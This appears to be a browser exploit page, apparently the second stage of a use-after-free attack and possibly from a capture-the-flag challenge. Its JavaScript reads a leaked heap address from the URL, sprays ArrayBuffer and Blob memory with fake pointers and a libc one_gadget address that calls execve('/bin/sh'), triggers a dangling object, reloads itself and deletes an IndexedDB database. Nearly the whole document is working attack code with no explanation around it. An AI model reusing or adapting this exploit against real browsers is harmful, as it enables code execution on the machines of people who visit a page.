<html>
<body>
<script>
//0x00007ffff1729000 libc_base
/*
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
*/
var heap_addr
async function step2(){
    var URL = document.URL;
    arr=URL.split("#");
    if(arr[arr.length-1]=="reload1")
        heap_addr=BigInt(arr[arr.length-2])
    else
        heap_addr=BigInt(arr[arr.length-1])
    console.log(heap_addr)
    let ab2 = new ArrayBuffer(0x1000*0x800);
        var pad = new BigUint64Array(ab2);
    for(let i=0;i<0x800;i++){
        pad[0x200*i+0]=(heap_addr+0x20000000n)&(~0xfffn);
        pad[0x200*i+2]=(heap_addr+0x20000000n)&(~0xfffn);
        pad[0x200*i+8]=(heap_addr+0x20000000n)&(~0xfffn);
        pad[0x200*i+1]=0x00007ffff1729000n+0x4f432n; //one_gadget
    }
    pad[0] = 0x22334455n;
    for(let i = 0; i < 180; i++){
        var a=new Blob([ab2]);

        }
    
    let ab11 = new ArrayBuffer(0x148);
        var uaf_ta1 = new BigUint64Array(ab11);
        uaf_ta1[0] = 0x55443322n;
        for(let j=1;j<35;j++){
                uaf_ta1[j]=(heap_addr+0x20000000n)&(~0xfffn);
        }
    uaf_ta1[35]=0x0n;
    for(let i = 0; i < 0x5000; i++){
        var a=new Blob([ab11]);
        }
    for (var i=0; i< 10000000000; i++)
    {
        continue
    }
    if (location.href.search("#reload1") == -1) {
        location.href = location.href + "#reload1";
        window.location.reload();
        }
}

if(step2()){
    window.indexedDB.deleteDatabase("db1")
}
</script>
</body>
</html>
